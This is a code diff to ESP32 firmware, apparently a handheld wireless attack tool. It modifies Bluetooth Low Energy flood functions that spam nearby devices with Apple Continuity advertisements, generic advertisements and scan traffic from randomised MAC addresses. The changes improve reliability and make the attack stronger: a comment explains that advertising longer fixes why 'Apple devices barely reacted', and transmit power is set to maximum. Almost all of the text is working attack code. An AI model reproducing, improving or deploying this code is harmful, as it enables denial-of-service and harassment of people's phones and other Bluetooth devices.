@@ -39,38 +39,43 @@ static bool s_bleInitialized = false;
 
 /// Ensure NimBLEDevice is initialised exactly once.  Also frees the Wi-Fi
 /// radio so BLE has uncontested access to 2.4 GHz.
-static void ensureBLEInit()
+static bool ensureBLEInit()
 {
   if ( s_bleInitialized )
-    return;
+    return true;
 
-  if ( access_point == 0 )
-    WiFi.softAPdisconnect(true);
-  WiFi.mode(WIFI_OFF);
-  delay(100);
+  // NOTE: the SoftAP is deliberately left running.  The previous version
+  // called WiFi.mode(WIFI_OFF), which killed the very access point the user
+  // was controlling the device from, and left the controller in a state where
+  // a second NimBLEDevice::init() could fail.  The ESP32 handles BLE/Wi-Fi
+  // coexistence in hardware.
 
-  NimBLEDevice::init("");
+  if ( !NimBLEDevice::init("") )
+  {
+    Serial.println("[ble] NimBLEDevice::init() FAILED - BLE attack unavailable");
+    return false;
+  }
+
   NimBLEDevice::setMTU(23);
   // Use maximum TX power for research purposes.
   NimBLEDevice::setPower(ESP_PWR_LVL_P9);
   s_bleInitialized = true;
+  return true;
 }
 
-/// Tear down NimBLE, restore the SoftAP if it was configured, then kill the
-/// calling FreeRTOS task.  Every BLE attack function must end by calling this.
+/// Tear down NimBLE, then kill the calling FreeRTOS task.  Every BLE attack
+/// function must end by calling this.
 static void shutdownBLE()
 {
   if ( s_bleInitialized )
   {
+    if ( s_adv != nullptr )
+    {
+      s_adv->stop();
+      s_adv = nullptr;
+    }
     NimBLEDevice::deinit(true);
     s_bleInitialized = false;
-  }
-
-  if ( access_point == 0 )
-  {
-    WiFi.mode(WIFI_AP);
-    delay(50);
-    WiFi.softAP(ssid.c_str(), password.c_str());
   }
 
   vTaskDelete(NULL);
@@ -127,9 +132,15 @@ void apple_ble_flood()
 {
   Serial.println("[apple_ble_flood] task entered");
 
-  ensureBLEInit();
+  if ( !ensureBLEInit() )
+    shutdownBLE();
 
   s_adv = NimBLEDevice::getAdvertising();
+  if ( s_adv == nullptr )
+  {
+    Serial.println("[apple_ble_flood] no advertising instance");
+    shutdownBLE();
+  }
   s_adv->stop();
 
   // Cycle through Apple Continuity opcodes.
@@ -144,6 +155,9 @@ void apple_ble_flood()
   while ( !stopJam )
   {
     updateJoystickButtons();
+
+    // Changing the address or the payload requires advertising to be stopped.
+    s_adv->stop();
 
     // Fresh static-random MAC per advertisement.
     generateRandomAddress(rndAddr, seed);
@@ -168,8 +182,14 @@ void apple_ble_flood()
 
     if ( s_adv->start(0) )
     {
-      delayMicroseconds(3000);
-      s_adv->stop();
+      // Advertise continuously for 250 ms instead of a 3 ms burst.  The old
+      // start/stop cycle threw away ~90% of the available duty cycle, which is
+      // why Apple devices barely reacted.
+      for ( uint32_t t = 0; t < 250 && !stopJam; t += 10 )
+      {
+        updateJoystickButtons();
+        delay(10);
+      }
     }
     else
     {
@@ -190,9 +210,15 @@ void ble_adv_flood()
 {
   Serial.println("[ble_adv_flood] task entered");
 
-  ensureBLEInit();
+  if ( !ensureBLEInit() )
+    shutdownBLE();
 
   s_adv = NimBLEDevice::getAdvertising();
+  if ( s_adv == nullptr )
+  {
+    Serial.println("[ble_adv_flood] no advertising instance");
+    shutdownBLE();
+  }
   s_adv->stop();
 
   uint32_t seed = esp_random();
@@ -205,6 +231,9 @@ void ble_adv_flood()
     updateJoystickButtons();
 
     seed = seed * 1664525UL + 1013904223UL;
+
+    // Changing the address or the payload requires advertising to be stopped.
+    s_adv->stop();
 
     // Fresh static-random MAC per advertisement.
     generateRandomAddress(rndAddr, seed);
@@ -230,8 +259,12 @@ void ble_adv_flood()
 
     if ( s_adv->start(0) )
     {
-      delayMicroseconds(2500);
-      s_adv->stop();
+      // Advertise continuously for 250 ms instead of a 2.5 ms burst.
+      for ( uint32_t t = 0; t < 250 && !stopJam; t += 10 )
+      {
+        updateJoystickButtons();
+        delay(10);
+      }
     }
     else
     {
@@ -250,14 +283,25 @@ void ble_scan_flood()
 {
   Serial.println("[ble_scan_flood] task entered");
 
-  ensureBLEInit();
+  if ( !ensureBLEInit() )
+    shutdownBLE();
 
   NimBLEScan *scanner = NimBLEDevice::getScan();
+  if ( scanner == nullptr )
+  {
+    Serial.println("[ble_scan_flood] no scanner instance");
+    shutdownBLE();
+  }
   scanner->setActiveScan(true);
   scanner->setInterval(40);
   scanner->setWindow(40); // scan window == interval → 100 % duty cycle
 
   s_adv = NimBLEDevice::getAdvertising();
+  if ( s_adv == nullptr )
+  {
+    Serial.println("[ble_scan_flood] no advertising instance");
+    shutdownBLE();
+  }
   s_adv->stop();
 
   uint32_t seed = esp_random();
